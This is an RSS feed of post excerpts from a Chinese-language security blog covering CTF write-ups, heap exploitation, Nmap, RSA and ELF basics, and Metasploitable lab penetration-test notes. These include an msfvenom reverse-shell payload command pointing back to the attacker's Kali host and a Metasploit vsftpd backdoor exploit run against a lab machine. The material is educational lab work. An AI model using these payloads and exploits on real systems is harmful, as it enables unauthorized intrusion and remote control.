<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ctf on ErrorPro</title><link>/tags/ctf/</link><description>Recent content in Ctf on ErrorPro</description><generator>Hugo</generator><language>zh-Hant-TW</language><lastBuildDate>Tue, 11 Jun 2024 00:00:00 +0800</lastBuildDate><atom:link href="/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>【CTF-WriteUp】AIS3 Pre-Exam 2024</title><link>/posts/2024/ais3_pre_exam_2024/</link><pubDate>Tue, 11 Jun 2024 00:00:00 +0800</pubDate><guid>/posts/2024/ais3_pre_exam_2024/</guid><description>AIS3 Pre-Exam 2024 先放結果
My First CTF：潛力獎
心得 第一次參加 My First CTF 跟 AIS3 Pre-Exam，最後有幾題到比賽結束才解出來，覺得滿可惜的，
希望下次能通靈出更多題目。
Write Up Misc Welcome 簽到題
FLAG: AIS3{Welc0me_to_AIS3_PreExam_2o24!}
Quantum Nim Heist Welcome to the Quantum Nim Heist, where traditional logic intertwines with the enigmatic realm of quantum mechanics to create a Nim game like no other. 跟電腦玩 Nim 遊戲，Wiki - Nim，
這裡的規則是拿走最後一棵石頭的人獲勝，而根據組合賽局理論，把每堆石頭數 XOR 後若為 0 則後手必勝，否則先手必勝。
看到 server.py
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def menu(): print_main_menu() choice = input(&amp;#39;what would you like to do?</description></item><item><title>【資訊安全】Metasploitable3 滲透測試實作（筆記）</title><link>/posts/2024/metasploitable3_writeup/</link><pubDate>Sat, 20 Apr 2024 00:00:00 +0800</pubDate><guid>/posts/2024/metasploitable3_writeup/</guid><description>先備知識 知道如何使用 VMware 或 VirtualBox Kali Linux 基本操作 能夠讓 Kali 連線至 Metasploitable3 良好的網路環境 確認 IP Win2k8:
1 ipconfig ub1404:
1 ifconfig 弱點掃描 使用 Nmap 將所有 port 掃描一遍，查看主機上開啟的 Service
1 sudo nmap -sV -sS -n -v --reason --open -p- &amp;lt;Metasploitable3 IP&amp;gt; &amp;lt;Metasploitable3 IP&amp;gt; 請替換成靶機 IP
文件上傳漏洞 掃描 8585 port 是否存在文件上傳漏洞
1 davtest -url http://&amp;lt;Metasploitable3 IP&amp;gt;:8585/uploads/ 利用 msfvenom 生成 reverse shell payload 1 msfvenom -p php/meterpreter_reverse_tcp LHOST=&amp;lt;Kali IP&amp;gt; LPORT=4444 -f raw &amp;gt; payload.</description></item><item><title>【HTB】Sacred Scrolls: Revenge</title><link>/posts/HTB/Sacred-Scrolls-Revenge/</link><pubDate>Tue, 05 Mar 2024 00:00:00 +0800</pubDate><guid>/posts/HTB/Sacred-Scrolls-Revenge/</guid><description>【HTB】Sacred Scrolls: Revenge Description Each house of the campus has its own secret library to store spells or spellbound messages so the others cannot see them. Messages are encrypted and must be signed by the boy who lived, turning them into sacred scrolls, otherwise they are not accepted in this library. You can try it yourself as long as you are a wizard of this house.
Checksec 1 2 3 4 5 6 7 [*] &amp;#39;/home/err0rpro/CTFLab/Hackthebox/SacredScrollsRevenge/sacred_scrolls&amp;#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b&amp;#39;.</description></item><item><title>【CTF】Heap Exploitation(Part 1 - Overview, UAF)</title><link>/posts/2023/ctf_heap/</link><pubDate>Thu, 16 Nov 2023 00:00:00 +0800</pubDate><guid>/posts/2023/ctf_heap/</guid><description>Heap Exploitation 預備知識 需要注意glibc的版本 知道典型的Memory layout 記憶體計算 1. Heap Overview 跟資料結構的Heap不同 存動態資料的記憶體區段 在Memory中由低往高生長 Allocator Linux中由glibc實作 dlmalloc (Doug Lea Malloc) - General-purpose allocator ptmalloc (Per-thread malloc) - glibc jemalloc - FreeBSD / Firefox / Facebook&amp;hellip; tcmalloc - Google / Golang / Chrome&amp;hellip; malloc dynamic memory allocator 第一次呼叫 malloc 1 2 3 4 5 6 if(要分配的大小小於128KB){ if(是第一次呼叫) 呼叫 brk() -&amp;gt; sys_brk() 分配 132KB 的Segment，此Segment稱為 main arena }else{ // 超過128KB mmap() -&amp;gt; sys_mmap() } 程式執行中free掉記憶體後不會馬上還給系統，會由glib代管 Chunk glibc做記憶體管理的資料結構 malloc分配的空間單位，分配出來的大小必須對齊0x10 Ex: malloc(0x15) -&amp;gt; 得到大小 0x20 + 0x10(header) 的chunk 依大小分類，發生free時會放到linked list中，這個linked list稱為bin fastbin (&amp;lt;64B) smallbin (&amp;lt;512B) largebin (&amp;gt;=512B) unsortedbin (如果free的chunk大小&amp;gt;64B，先放到這裡一段時間後再加到對應的bin) 種類 Allocated Chunk prev_size: 如果前一個chunk是free的，就存前一個chunk的大小 size: 這個chunk的大小 + Status flag(最後3個bit)(因為0x10 padding，後面4bit可以不存) bit 0: PREV_INUSE: 前一個chunk是否正被使用 bit 1: IS_MMAPPED: 是否是mmap分配的 bit 2: NON_MAIN_ARENA: 是否不是main arena User Data Free Chunk prev_size size fd: 指標指向下一個chunk bk: 指標指向上一個chunk fd_nextsize: 下一個largebin的指標 bk_nextsize: 上一個largebin的指標 Data Top Chunk prev_size size: 還剩多少空間 1 2 3 4 5 6 7 8 9 10 struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free).</description></item><item><title>【CTF】CTF工具集</title><link>/posts/2023/ctf_tools/</link><pubDate>Sun, 12 Nov 2023 00:00:00 +0800</pubDate><guid>/posts/2023/ctf_tools/</guid><description>CTF工具集 基本工具 Python 2+3 &amp;amp; pip Editor: vim, vscode, notepad Git Kali Linux 掃描工具 工具名稱 種類 說明 nmap web 網路掃描 dirsearch web 網站目錄掃描 nikto web Web server漏洞掃描 dirb web 網站目錄掃描 sqlmap web SQL Injection 測試 wpscan web WordPress漏洞掃描 crypto pwn reverse stego misc forensics android windows</description></item><item><title>【CTF】Nmap</title><link>/posts/2023/nmap/</link><pubDate>Sun, 12 Nov 2023 00:00:00 +0800</pubDate><guid>/posts/2023/nmap/</guid><description>Nmap Nmap Download
Debian安裝
1 sudo apt install nmap 使用
1 nmap -sC -sV &amp;lt;ip/hostname&amp;gt; -sC: 使用預設的Nmap腳本(&amp;ndash;script=default) -sV: 啟用版本偵測(-A) -T4: 設定掃描速度為4(1-5)，預設為3 -sS: 送TCP SYN封包來掃描 -sT: 掃描時使用系統呼叫API送封包(猜作業系統版本，需要root) -p: 指定port -Pn: 跳過Ping掃描，全當存活服務(避免防火牆拒絕) -4: 強制使用IPv4 -6: 強制使用IPv6</description></item><item><title>【CTF】密碼學-RSA加密演算法</title><link>/posts/2023/rsa/</link><pubDate>Fri, 03 Nov 2023 00:00:00 +0800</pubDate><guid>/posts/2023/rsa/</guid><description>RSA加密演算法 簡介 由三位數學家Rivest、Shamir、Adleman所提出，RSA就是他們的姓氏第一個字母組成的。 非對稱加密演算法(公鑰加密演算法)。 一般有1024、2048、4096位的金鑰長度，位是二進位位元數 生成金鑰過程 選兩個質數$p$、$q$，$p\neq q$。 算 $\phi(pq) $，其中 $\phi(n)$ 為歐拉函數，表示小於 $n$ 且與 $n$ 互質的正整數個數，歐拉定理 $\phi(pq) = (p-1)(q-1)$。 選一個數 $e$，使 $1 \leq e \leq \phi(pq)$ 且 $e$ 與 $\phi(pq)$ 互質。 找一個數 $d$，使 $ed \equiv 1 \pmod{\phi(pq)}$，即 $ed$ 除以 $phi(pq)$ 的餘數 $ = 1$。 4-1. 這步就是在求 $e$ 關於 $\phi(pq)$ 的模逆元，可以用擴展歐幾里得法求，參考：算法筆記-數論 $p$、$q$、$e$ 組成公鑰 $(n,e)$，$p$、$q$、$d$ 組成私鑰 $(n,d)$。 加密過程 將明文字串 $m$ 轉換成數字(ASCII)陣列。 一個數一個數加密，設數字為 $x$，計算 $x^e\ mod\ n$，得到密文。 把這些密文再組合起來 解密過程 把密文拆開，一個數一個數解密，設數字為 $y$，計算 $y^d\ mod\ n$，得到明文。 把這些明文再組合起來 攻擊 gmpy2 線上分解n RSACTFTool</description></item><item><title>【系統安全】ELF檔案格式</title><link>/posts/2023/elf/</link><pubDate>Wed, 25 Oct 2023 00:00:00 +0800</pubDate><guid>/posts/2023/elf/</guid><description>ELF檔案格式 ELF(Executable and Linkable Format) 可執行可連結格式 定義：/usr/include/elf.h 類型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 &amp;gt; gcc a.c -o a.o &amp;gt; gcc b.c -static -o b.o &amp;gt; gcc c.c -c -o c.o &amp;gt; gcc d.c -fPIC d.c -o d.o &amp;amp;&amp;amp; gcc d.o -shared -o d.so ##### &amp;gt; file a.o a.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), dynamically linked, not stripped &amp;gt; file b.</description></item><item><title>【系統安全】Linux 安全機制</title><link>/posts/2023/linux_system_security/</link><pubDate>Sun, 22 Oct 2023 00:00:00 +0800</pubDate><guid>/posts/2023/linux_system_security/</guid><description>Address space layout randomization(ASLR): 記憶體隨機載入，會把.stack section, .so section, mmap()隨機化，可以防止攻擊者跳到指定記憶體任意利用
繞過：目前沒有很好的繞過方法，只能靠運氣猜記憶體在哪
Stack Canary: 金絲雀，在以前礦工在挖礦的時候會帶一隻金絲雀下去，如果金絲雀暈倒表示可能挖到有毒氣體了，要趕快跑，在程式裡面也會有這樣的機制，每次執行一個函數會先養一隻金絲雀(一個隨機數)，如果攻擊者傷害到那隻金絲雀(覆寫掉隨機數)就表示受到攻擊，程式在函式離開前檢查到就會直接停止
繞過：只要不碰到金絲雀，或推算出金絲雀長什麼樣子就能繞過
No-eXecute(NX): 堆疊不可執行，把記憶體的stack標記為不可執行，可以防止攻擊者跳到堆疊任意寫程式
繞過：不要跳到stack，那跳到text就好了
PIE(Position Independent Executable): 記憶體隨機化，跟ASLR很像，但是是在編譯器上做好，會把.text section, .data section, .bss section隨機化
繞過：讓程式執行的過程中洩露記憶體然後就能推算
程式實際位址 = 程式加載位址 + 偏移位址
Fortify Source: 在編譯時檢查是否存在buffer overflow，並將危險函式替換成安全函式，例如strcpy()會被替換成strncpy()
RELRO(RELocation Read-Only): 在Lazy Binding時，會將.got.plt section設為read-only，可以防止攻擊者修改.got.plt section</description></item><item><title>【系統安全】組合語言</title><link>/posts/2023/asm/</link><pubDate>Sun, 22 Oct 2023 00:00:00 +0800</pubDate><guid>/posts/2023/asm/</guid><description>組合語言 編譯流程 詞法分析 (Lexical Analysis) 切token -&amp;gt; 詞素 (Lexeme)
語法分析 (Syntax Analysis) 建立語法樹 (Syntax Tree)
語意分析 (Semantic Analysis) 用語法樹跟符號表 (Symbol Table) 來檢查語意
中間碼產生 (Intermediate Code Generation)
最佳化 (Optimization)
目標碼產生 (Code Generation)
GCC編譯流程 前置處理 (Preprocessing) -&amp;gt; 編譯 (Compilation) -&amp;gt; 組譯 (Assembly) -&amp;gt; 連結 (Linking) 檔案副檔名 (.i) (.s) (.o) (.out) 指令參數 -E -S -c 前置處理 (Preprocessing) 遞迴處理所有 #include 遞迴展開所有 #define 刪除所有註解 處理所有 #if #ifdef #ifndef #else #endif 行號記錄 編譯 (Compilation) 組語格式：預設 AT&amp;amp;T 語法，可用 -masm=intel 改成 Intel 語法</description></item><item><title>【CTF-WriteUp】PicoCTF-Here's a LIBC</title><link>/posts/2023/ctf_picoctf_heresalibc/</link><pubDate>Fri, 20 Oct 2023 00:00:00 +0800</pubDate><guid>/posts/2023/ctf_picoctf_heresalibc/</guid><description>題目：
給你指定的libc與elf file請pwn掉它 概念： 組合語言課學的各種東西 逆向工程 Little endian stack frame ELF format ret2libc 題解： 執行 file 查看檔案屬性 這是一個64位ELF格式可執行檔
執行 checksec 查看安全屬性 只開了 NX(No-Execute, 堆疊不可執行)
拿去Ghidra或IDA逆向 看起來會用到的函式：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 char convert_case(char c, int f){ char ret; if( c &amp;lt; &amp;#39;a&amp;#39; || c &amp;gt; &amp;#39;z&amp;#39; ){ if( c &amp;lt; &amp;#39;A&amp;#39; || c &amp;gt; &amp;#39;Z&amp;#39; ) ret = a; else if(f % 2 == 0) ret = a; else ret = a + 32; } else if( f % 2 == 0 ) ret = a - 32; else ret = a; return ret; } void do_stuff(){ char garbage; char str[112]; scanf(&amp;#34;%[^\n]&amp;#34;, str); scanf(&amp;#34;%c&amp;#34;, &amp;amp;garbage); for(int i = 0; i &amp;lt; 100 ; i++){ str[i] = convert_case(str[i], i); } puts(str); } void main(){ .</description></item><item><title>【資訊安全】Metasploitable3 環境建置(Windows VMware)</title><link>/posts/2022/metasploitable3_installation/</link><pubDate>Tue, 29 Nov 2022 00:00:00 +0800</pubDate><guid>/posts/2022/metasploitable3_installation/</guid><description>需求 Windows 10 up VMware Workstation Pro 良好的網路環境 1. 下載並安裝 Vagrant &amp;amp; Vagrant VMware Utility Vagrant 是建置虛擬機的工具，透過 Vagrantfile 來設定虛擬機。
Download Vagrant
Download Vagrant VMware Utility
2. 快速建置 打開 PowerShell，cd 到適當的資料夾，依序輸入
1 2 3 4 mkdir metasploitable3-workspace cd metasploitable3-workspace Invoke-WebRequest -Uri &amp;#34;https://raw.githubusercontent.com/rapid7/metasploitable3/master/Vagrantfile&amp;#34; -OutFile &amp;#34;Vagrantfile&amp;#34; vagrant up --provider=vmware_desktop 等待一段時間，完成後可以在
C:\Users\{username}\.vagrant.d\boxes\xxx\yyy\vmware_desktop\ 下看到 box 檔案。
將 vmware_desktop 資料夾複製到適當的地方，接著打開 VMWare，在 Library 下按右鍵點選 Scan for Virtual Machines，選擇剛剛複製的資料夾，就可以使用 Metasploitable3 了。</description></item><item><title>【資訊安全】Metasploitable2 滲透測試實作(筆記)</title><link>/posts/2022/metasploitable2_vsftpd/</link><pubDate>Wed, 23 Nov 2022 00:00:00 +0800</pubDate><guid>/posts/2022/metasploitable2_vsftpd/</guid><description>先備知識 知道如何使用 VMware 或 VirtualBox Kali Linux 基本操作 能夠讓 Kali 連線至 Metasploitable2 Metasploitable2 一種充滿漏洞的Linux系統，適合用於練習滲透測試。
可直接到 Sourceforge 上下載虛擬機檔。
偵查 開啟 Metasploitable2，會先要求輸入帳號密碼，帳密都是 msfadmin (輸入密碼時不會顯示在螢幕上)。
輸入 ifconfig 查看 IP 位址，假設為 192.168.235.130。
打開 Kali Linux (IP為192.168.235.128)，終端輸入 msfconsole 進入 Metasploit。
使用 nmap 掃描可以連的 port 1 msf6 &amp;gt; nmap -sV 192.168.235.130 可以看到有一大堆 port 是開著的
滲透 看看 vsftpd 有沒有洞，在 msf 中輸入 search vsftpd，可以看到有一個 exploit 可以使用 使用這個 exploit，用 show options 可以看到這個 exploit 需要的參數，然後用 set 參數 值 設定一些參數。 1 2 3 msf6 &amp;gt; use exploit/unix/ftp/vsftpd_234_backdoor msf6 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; show options msf6 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; set RHOSTS 192.</description></item><item><title>【CTF-WriteUp】PicoCTF-file-run2</title><link>/posts/2022/ctf_picoctf_file_run2/</link><pubDate>Tue, 04 Oct 2022 00:00:00 +0800</pubDate><guid>/posts/2022/ctf_picoctf_file_run2/</guid><description>題目：
給你一個檔案，執行它時輸入&amp;quot;Hello!&amp;quot;(不含引號)。 概念： 逆向工程 Linux 指令操作 Linux 權限控制 題解 丟進IDA看看，發現確實只要輸入Hello!就能跑出Flag，
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 main(int param_1,long param_2){ int var1; if ((param_1 &amp;lt; 2) || (2 &amp;lt; param_1)) { puts(&amp;#34;Run this file with only one argument.&amp;#34;); } else { var1 = strcmp(*(char **)(param_2 + 8),&amp;#34;Hello!&amp;#34;); if (var1 == 0) { printf(&amp;#34;The flag is: %s&amp;#34;,flag); } else { puts(&amp;#34;Won\&amp;#39;t you say \&amp;#39;Hello!</description></item><item><title>gdb 除錯工具學習</title><link>/posts/2022/gdb/</link><pubDate>Mon, 26 Sep 2022 00:00:00 +0800</pubDate><guid>/posts/2022/gdb/</guid><description>What is GDB? gdb全名為gnu debugger，是一種動態Debug的工具。
使用 我們可以先寫一個簡易的Hello World，並宣告一些變數
1 2 3 4 5 6 7 8 # include&amp;lt;stdio.h&amp;gt; int main(){ int a = 5; int b = a * 6; int c = b + 4; printf(&amp;#34;Hello World\n&amp;#34;); return 0; } 記得在編譯時加上參數 -g，否則gdb將提示找不到除錯符，加了只差在程式大小會變大。
1 2 $ gcc -g hello.c -o hello $ gdb ./hello 指令 指令 簡寫 簡述 help h 查看指令說明 list l 印出程式碼 file 開啟檔案 run r 執行程式 kill 停止程式 breakpoint b, bre, break 設定斷點 ex: b 15表示執行到第15行 continue c, cont 繼續執行 next n 步過(遇到呼叫函式會將該函式當成一條指令執行) step s 步入(遇到呼叫函式會進入函式一步一步執行) print p 印出變數的值 ex: p num display 每次步過/入後印出變數值 ex: display num info 查看特定資訊 ex: info break查看設了哪些斷點，不輸入參數可查詢指令 quit q 離開gdb，或按Ctrl+C &amp;lt;Click&amp;gt; Enter 執行上一條指令</description></item><item><title>【CTF-WriteUp】EasyCTF-adder</title><link>/posts/2022/ctf_easyctf_adder/</link><pubDate>Sat, 12 Mar 2022 00:00:00 +0800</pubDate><guid>/posts/2022/ctf_easyctf_adder/</guid><description>題目：
給你一個加法程式，找出Flag adder
概念： 反編譯 題解 在linux執行程式，看到要你輸入三個數，先隨意輸入，發現輸出nope。
開啟反編譯工具Ghidra對檔案反編譯，發現在main函式中的flag前綴，
而只要讓該行上面的if條件成立應該就能得到flag，顯然我們只要輸入三個數讓他加起來等於 0x539 即可。
透過簡單的進位換算，得$539_{16}\ =\ 1337_{10}$
開啟程式輸入1337 0 0 就可以拿到flag了~</description></item></channel></rss>